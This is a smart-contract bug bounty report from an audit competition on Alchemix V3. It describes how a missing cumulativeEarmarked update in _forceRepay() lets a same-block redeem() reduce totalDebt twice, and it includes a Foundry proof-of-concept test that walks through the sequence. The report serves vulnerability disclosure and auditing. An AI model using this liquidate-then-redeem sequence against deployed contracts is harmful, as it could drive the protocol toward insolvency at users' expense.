# 57825 sc high forced repay cover enables double counted debt reduction in redeem

**Submitted on Oct 29th 2025 at 04:28:50 UTC by @zcai for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57825
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

The `_forceRepay()` function reduces an account's earmarked debt and transfers MYT to the Transmuter but fails to decrement the global `cumulativeEarmarked` counter. This oversight allows the `redeem()` function to treat previously repaid funds as fresh cover, enabling double-counting where `totalDebt` is reduced twice for the same underlying repayment. This is a High severity vulnerability that corrupts core system accounting under normal liquidation and redemption operations.

## Vulnerability Details

When `_forceRepay()` processes a liquidation, it correctly reduces the account's `earmarked` debt and transfers the corresponding MYT tokens to the Transmuter. However, it does not decrement the global `cumulativeEarmarked` variable, leaving it inflated relative to the actual sum of individual account earmarks.

The `redeem()` function calculates available cover by examining the Transmuter's MYT balance increase (`deltaYield`) and applies this cover to reduce both `cumulativeEarmarked` and `totalDebt`. Since the global earmarked counter was never decremented during forced repayment, `redeem()` sees the forced-repaid MYT as legitimate cover and reduces `totalDebt` a second time for the same underlying repayment.

1. During liquidation, `_forceRepay()` reduces `account.earmarked` (lines 761-762) but leaves `cumulativeEarmarked` unchanged.
2. MYT tokens are transferred to the Transmuter (line 779).
3. In the **same block**, Transmuter calls `redeem()`; `_earmark()` early-returns (same block), so `lastTransmuterTokenBalance` is **not** refreshed to include the transfer from step 2.
4. `redeem()` computes `deltaYield` against the stale snapshot and treats the newly transferred MYT as **fresh cover**.
5. Because `liveEarmarked = cumulativeEarmarked` still includes the previously repaid amount, the cover is applied against inflated earmarked debt.
6. Both `cumulativeEarmarked` and `totalDebt` are decremented **again** (lines 613-616), double-counting the same repayment.

The root cause is the missing global earmark adjustment in `_forceRepay()`, contrasting with the correct implementation in the regular `repay()` function which properly decrements `cumulativeEarmarked` (lines 525-526). does exist.

## Impact Details

This vulnerability breaks core solvency accounting by causing `totalDebt` to be understated relative to outstanding synthetic tokens. The double-counted debt reduction corrupts fundamental system invariants that underpin liquidation thresholds, redemption calculations, and global collateralization ratios. This accounting desynchronization can lead to unfair value distribution, incorrect liquidation triggers, and systematic tracking errors that compound over time as more forced repayments and redemptions occur

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L738-L782>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol?utm\\_source=immunefi#L589-L641>

## Link to Proof of Concept

<https://gist.github.com/i-am-zcai/57c87d99bc1fc262c99c1053a7551516>

## Proof of Concept

## Proof of Concept

```solidity
    function test_DoubleCountDebtOnRedeemCover_SameBlock() public {
        // 1) Borrower deposits MYT into Alchemist and borrows at min collateralization
        vm.startPrank(borrower);
        uint256 depositAmount = IERC20(address(vault)).balanceOf(borrower) / 2; // deposit half of shares
        alchemist.deposit(depositAmount, borrower, 0);
        uint256 tokenId = IERC721Enumerable(address(alchemistNFT)).tokenOfOwnerByIndex(borrower, 0);

        uint256 maxBorrow = alchemist.getMaxBorrowable(tokenId);
        alchemist.mint(tokenId, maxBorrow, borrower);
        vm.stopPrank();

        // totalDebt after mint
        uint256 debtAfterMint = alchemist.totalDebt();
        assertGt(debtAfterMint, 0, "no debt after mint");

        // 2) Create a redemption to generate earmarking quickly (timeToTransmute=1)
        uint256 redemptionAmount = debtAfterMint / 20; // 5% of total debt
        deal(address(alToken), redeemer, redemptionAmount);
        vm.startPrank(redeemer);
        IERC20(address(alToken)).approve(address(transmuter), redemptionAmount);
        transmuter.createRedemption(redemptionAmount);
        vm.stopPrank();

        // Advance several blocks so earmark query has a non-zero window
        vm.roll(block.number + 5);

        // 3) Liquidator triggers liquidation; since lower bound == min collateralization, account is eligible
        // This will first force-repay earmarked debt sending MYT to Transmuter
        vm.startPrank(liquidator);
        (uint256 yieldAmount,,) = alchemist.liquidate(tokenId);
        vm.stopPrank();

        // Ensure force-repay occurred and we have non-zero cover at Transmuter
        assertGt(yieldAmount, 0, "No force-repay occurred");
        assertGt(IERC20(address(vault)).balanceOf(address(transmuter)), 0, "No MYT cover at Transmuter");

        // 4) In the SAME BLOCK, have the Transmuter call redeem(0).
        // _earmark() will early-return (same block), leaving lastTransmuterTokenBalance stale.
        // redeem() will treat the newly transferred MYT as fresh cover and reduce totalDebt again.
        uint256 debtBeforeRedeem = alchemist.totalDebt();
        uint256 depositedBefore = alchemist.getTotalDeposited();

        vm.prank(address(transmuter));
        alchemist.redeem(0);

        uint256 debtAfterRedeemCover = alchemist.totalDebt();
        uint256 depositedAfter = alchemist.getTotalDeposited();

        // Concrete impact: totalDebt fell again while no collateral left the Alchemist (amount=0 in redeem)
        assertLt(debtAfterRedeemCover, debtBeforeRedeem, "Debt did not fall from cover consumption");
        assertEq(depositedAfter, depositedBefore, "Collateral moved despite redeem(0)");
    }
```

**Command:**

```
forge test -vvv --mt DoubleCountDebtOnRedeemCover_SameBlock
```

**Impact (demonstrated by the PoC):**

* `totalDebt` decreases once during liquidation (via `_forceRepay`) and **again** during `redeem(0)` in the **same block**, for the **same underlying repayment**.
* `cumulativeEarmarked` is reduced during `redeem()` despite the corresponding account earmark already being cleared during `_forceRepay()`.
* No additional collateral leaves the Alchemist on `redeem(0)`, yet `totalDebt` falls, breaking solvency accounting invariants.
